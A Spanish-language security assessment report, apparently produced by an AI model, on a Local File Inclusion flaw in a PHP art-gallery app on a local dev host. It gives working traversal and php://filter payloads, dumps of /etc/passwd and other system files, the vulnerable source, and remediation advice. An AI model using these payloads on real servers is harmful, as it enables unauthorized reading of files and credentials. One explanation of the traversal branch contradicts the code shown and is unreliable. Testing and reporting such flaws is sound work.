# Informe de Análisis de Seguridad — Local File Inclusion (LFI)

**Fecha:** 2026-04-21T08:12:15  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Modelo:** Claude Sonnet 4.6  
**Estado:** ✅ Vulnerabilidad encontrada y explotada

---

## 1. Resumen Ejecutivo

Se realizó un análisis de seguridad sobre la aplicación web ubicada en `http://web.dev.local:8081`. Se identificó una vulnerabilidad crítica de **Local File Inclusion (LFI)** en el parámetro `page` del archivo `gallery.php`. Esta vulnerabilidad permite leer archivos arbitrarios del sistema de ficheros del servidor, incluyendo archivos de configuración sensibles y el código fuente PHP de la aplicación.

---

## 2. Reconocimiento

- **Servidor:** Apache/2.4.65 (Debian)  
- **Tecnología backend:** PHP/8.1.33  
- **Aplicación:** Galería de Arte Virtual  
- **URL raíz:** `http://web.dev.local:8081/`

### Puntos de entrada identificados

| URL | Parámetro | Método |
|-----|-----------|--------|
| `gallery.php?page=modern` | `page` | GET |
| `gallery.php?page=classic` | `page` | GET |
| `gallery.php?page=abstract` | `page` | GET |
| `gallery.php?page=about` | `page` | GET |

---

## 3. Vulnerabilidad Identificada

### 3.1 Local File Inclusion (LFI) — CRÍTICA

**Localización:** `http://web.dev.local:8081/gallery.php?page=`  
**Parámetro vulnerable:** `page`  
**Severidad:** Crítica (CVSS ~9.0)

#### Código vulnerable (extraído mediante PHP filter wrapper)

```php
<?php
$page = $_GET['page'] ?? 'modern';

// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    echo "<h3>Página no encontrada</h3>";
    echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
    echo "</div>";
    // Try to include anyway
    @include($file);
}
?>
```

**Análisis del código:** El parámetro `$page` se usa **sin ninguna validación ni sanitización** en una llamada a `include()`. La única lógica de ramificación es si el parámetro contiene un `.` o no, lo que permite dos vectores de ataque:

- **Path traversal clásico:** `../../../etc/passwd` (sin extensión → se construye ruta con `/pages/` prefix, pero el traversal supera el directorio)
- **PHP wrapper:** `php://filter/convert.base64-encode/resource=<archivo>` (contiene `.` → se usa directamente)

---

## 4. Explotación

### 4.1 Path Traversal — Lectura de /etc/passwd

**Payload:**
```
GET /gallery.php?page=../../../etc/passwd HTTP/1.1
```

**Resultado exitoso:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 PHP Filter Wrapper — Lectura de código fuente

**Payload:**
```
GET /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php HTTP/1.1
```

El wrapper `php://filter` permite leer el código fuente PHP **sin ejecutarlo**, obteniendo el contenido en base64. Se recuperó el código fuente completo de `gallery.php`.

### 4.3 Lectura de archivos del sistema

| Archivo | Estado | Información obtenida |
|---------|--------|---------------------|
| `/etc/passwd` | ✅ Leído | 18 usuarios del sistema |
| `/etc/hosts` | ✅ Leído | IP interna: `172.19.0.2` (contenedor Docker) |
| `/proc/version` | ✅ Leído | Linux 6.8.0-41-generic (Ubuntu 24.04) |
| `/etc/apache2/apache2.conf` | ✅ Leído | Configuración Apache (DocumentRoot: `/var/www/html`) |
| `gallery.php` (código fuente) | ✅ Leído | Código PHP completo vía filter wrapper |
| `index.php` (código fuente) | ✅ Leído | Código PHP completo vía filter wrapper |
| `/etc/shadow` | ❌ Denegado | Sin permisos de lectura (esperado) |

### 4.4 Información del entorno

- **Sistema operativo:** Linux 6.8.0-41-generic (Ubuntu 24.04)
- **IP del contenedor:** 172.19.0.2 (entorno Docker)
- **DocumentRoot Apache:** /var/www/html
- **Hostname del contenedor:** d5054e367753

---

## 5. Impacto

| Riesgo | Descripción |
|--------|-------------|
| **Exposición de información** | Lectura de usuarios del sistema, configuración de red, versión del SO |
| **Lectura de código fuente** | Posible exposición de credenciales hardcodeadas, lógica de negocio, otros endpoints |
| **Escalada potencial** | Con `allow_url_include=On` (no verificado), podría escalar a RCE |
| **Reconocimiento interno** | Revelación de arquitectura interna (Docker, IPs internas) |

---

## 6. Recomendaciones

1. **Validar y sanitizar la entrada del usuario:** Nunca pasar directamente el input del usuario a funciones como `include()`, `require()`, `fopen()`, etc.

2. **Usar una lista blanca (whitelist):** Solo permitir valores conocidos:
   ```php
   $allowed_pages = ['modern', 'classic', 'abstract', 'about'];
   if (!in_array($_GET['page'], $allowed_pages)) {
       $page = 'modern'; // default seguro
   }
   ```

3. **Deshabilitar PHP wrappers peligrosos** en `php.ini`:
   ```ini
   allow_url_include = Off
   allow_url_fopen = Off
   ```

4. **Configurar `open_basedir`** para restringir el acceso del PHP al directorio de la aplicación:
   ```ini
   open_basedir = /var/www/html
   ```

5. **Desactivar la visualización de errores** en producción para no revelar rutas del sistema.

---

## 7. Evidencias

### Petición de explotación exitosa
```
GET /gallery.php?page=../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081
```

### Respuesta (fragmento)
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

### Petición con PHP filter wrapper
```
GET /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php HTTP/1.1
Host: web.dev.local:8081
```

---

## 8. Conclusión

La aplicación **Galería de Arte Virtual** presenta una vulnerabilidad **crítica de LFI** que permite a cualquier atacante no autenticado leer archivos arbitrarios del servidor. La vulnerabilidad se encuentra en `gallery.php` y es explotable de forma directa sin ninguna autenticación previa. Se recomienda **corrección inmediata** siguiendo las recomendaciones del apartado 6.

---

*Informe generado automáticamente por análisis de seguridad — 2026-04-21T08:12:15 UTC*
